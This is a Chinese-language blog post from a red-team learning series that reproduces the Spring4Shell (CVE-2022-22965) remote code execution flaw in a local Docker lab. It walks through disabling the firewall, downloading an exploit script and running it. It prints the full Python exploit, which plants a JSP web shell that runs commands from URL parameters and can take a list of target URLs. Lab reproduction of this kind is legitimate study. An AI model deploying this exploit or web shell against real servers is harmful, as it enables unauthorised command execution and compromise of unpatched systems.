---
title: 【開局地端紅隊小白與雲端資安的清晨Punch】Day22 Spring4Shell CVE-2022-22965 單機測試
date: 2025-12-25
tags: [資訊安全]
categories: 技術文章
source: https://ithelp.ithome.com.tw/articles/10347267
---

# Spring4Shell CVE-2022-22965單機測試

[[漏洞分析] 002 復現 Spring4Shell: Spring Core RCE JDK 9+ CVE-2022-22965](https://feifei.tw/springshell-spring-core-rce/)

## 確認連線狀態與關閉防火牆

- 關閉防火牆

```
┌──(root㉿kali)-[/home/iris/Downloads]
└─# sudo iptables -F

┌──(root㉿kali)-[/home/iris/Downloads]
└─# sudo iptables -X

┌──(root㉿kali)-[/home/iris/Downloads]
└─# sudo iptables -P INPUT ACCEPT

┌──(root㉿kali)-[/home/iris/Downloads]
└─# sudo iptables -P FORWARD ACCEPT

┌──(root㉿kali)-[/home/iris/Downloads]
└─# sudo iptables -P OUTPUT ACCEPT
```

- 確認Port監聽狀態/Ping

```
┌──(root㉿kali)-[/home/iris/Downloads]
└─# netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:46619         0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:8066            0.0.0.0:*               LISTEN
tcp6       0      0 ::1:3350                :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::8066                 :::*                    LISTEN
tcp6       0      0 :::3389                 :::*                    LISTEN
udp        0      0 0.0.0.0:68              0.0.0.0:*
udp6       0      0 fe80::449:30ff:fe6c:546 :::*
┌──(root㉿kali)-[/home/iris/Downloads]
└─# ping 172.104.100.165
PING 172.104.100.165 (172.104.100.165) 56(84) bytes of data.
64 bytes from 172.104.100.165: icmp_seq=1 ttl=48 time=125 ms
64 bytes from 172.104.100.165: icmp_seq=2 ttl=48 time=125 ms
```

## 整體操作步驟

### 載docker image

docker pull vulfocus/spring-core-rce-2022-03-29:latest

### 開8066:8080執行

- 到http://127.104.100.165:8066/網站可以看到ok，代表運行成功

docker run -p 8066:8080 vulfocus/spring-core-rce-2022-03-29:latest

![image](https://hackmd.io/_uploads/Bkw-ODclC.png)

### 載攻擊腳本

wget https://raw.githubusercontent.com/dinosn/spring-core-rce/main/test.py

### 執行攻擊腳本

python3 test.py --url http://127.104.100.165:8066/

```
#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:

        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()
```

### 觀察漏洞執行

網址:http://127.104.100.165:8066/tomcatwar.jsp?pwd=j&cmd=whoami

![image](https://hackmd.io/_uploads/S1C__D5e0.png)

# 相關資料

[修改資訊 spring-projects/spring-framework](https://github.com/spring-projects/spring-framework/tags)

![image](https://hackmd.io/_uploads/HJfjpDqxC.png)
